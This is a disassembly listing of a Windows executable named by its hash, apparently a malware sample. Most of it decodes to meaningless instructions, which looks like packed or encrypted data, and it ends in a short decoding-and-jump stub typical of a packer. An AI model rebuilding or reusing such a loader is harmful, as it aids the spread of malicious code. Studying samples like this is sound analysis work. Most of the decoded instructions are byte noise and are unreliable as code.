
fec69061f493749830e1e76b43416887b3b130618068e5d05180525eb7cee383.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	cmp    DWORD PTR [edi],eax
  4d0002:	jle    0x4cfff2
  4d0004:	sbb    al,0x6a
  4d0006:	jns    0x4cff92
  4d0008:	lea    ebx,[ecx-0x3f993e8d]
  4d000e:	inc    ecx
  4d000f:	dec    esi
  4d0010:	inc    esp
  4d0011:	aas    
  4d0012:	mov    edi,0xc8640c79
  4d0017:	adc    DWORD PTR [ebp-0xc],eax
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	lds    esi,FWORD PTR [edx]
  4d06c2:	jmp    0x37ba:0x9339a968
  4d06c9:	int    0xc5
  4d06cb:	test   DWORD PTR [edx],esp
  4d06cd:	fmul   QWORD PTR [ecx]
  4d06cf:	shr    ah,cl
  4d06d1:	jns    0x4d06af
  4d06d3:	dec    edi
  4d06d4:	test   DWORD PTR [ebp+edx*8+0xbd92ca9],edx
  4d06db:	retf   
  4d06dc:	sbb    DWORD PTR [ecx-0x666e3b52],ecx
  4d06e2:	retf   0x2c31
  4d06e5:	fsub   st(0),st
  4d06e7:	fstp   TBYTE PTR [ebx+0x5f5dc283]
  4d06ed:	call   DWORD PTR ds:0x4d209c
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x1c
  4d0700:	lea    edi,ds:0x4d31d0
  4d0706:	mov    DWORD PTR [edi-0xf0],0xfffffb8c
  4d0710:	push   edi
  4d0711:	mov    ecx,0x0
  4d0716:	push   ecx
  4d0717:	call   0x4d0868
  4d071c:	add    esp,0x4
  4d071f:	pop    edi
  4d0720:	push   edi
  4d0721:	push   DWORD PTR [edi+0x1d8]
  4d0727:	push   DWORD PTR [edi+0x194]
  4d072d:	push   DWORD PTR [edi+0xe0]
  4d0733:	push   ecx
  4d0734:	call   0x4d0f74
  4d0739:	add    esp,0x10
  4d073c:	pop    edi
  4d073d:	push   edi
  4d073e:	push   0x0
  4d0740:	call   0x4d1354
  4d0745:	add    esp,0x4
  4d0748:	pop    edi
  4d0749:	add    esp,0x1c
  4d074c:	pop    ebp
  4d074d:	ret    
  4d074e:	add    BYTE PTR [eax],al
  4d0750:	pop    edi
  4d0751:	call   DWORD PTR ds:0x4d2098
  4d0757:	call   edi
  4d0759:	add    BYTE PTR [eax],al
  4d075b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0761:	sub    esp,0x2c
  4d0764:	mov    ecx,0x4d3010
  4d0769:	xor    DWORD PTR [ecx+0x18c],ecx
  4d076f:	push   ecx
  4d0770:	push   eax
  4d0771:	push   esi
  4d0772:	push   DWORD PTR [ecx+0x1a0]
  4d0778:	call   0x4d0a74
  4d077d:	add    esp,0xc
  4d0780:	pop    ecx
  4d0781:	push   ecx
  4d0782:	call   0x4d0874
  4d0787:	add    esp,0x4
  4d078a:	pop    ecx
  4d078b:	mov    edi,0x4d2048
  4d0790:	mov    edi,DWORD PTR [edi]
  4d0792:	push   edi
  4d0793:	push   DWORD PTR [ecx+0x11c]
  4d0799:	pop    ebx
  4d079a:	call   ebx
  4d079c:	add    esp,0x2c
  4d079f:	pop    ebp
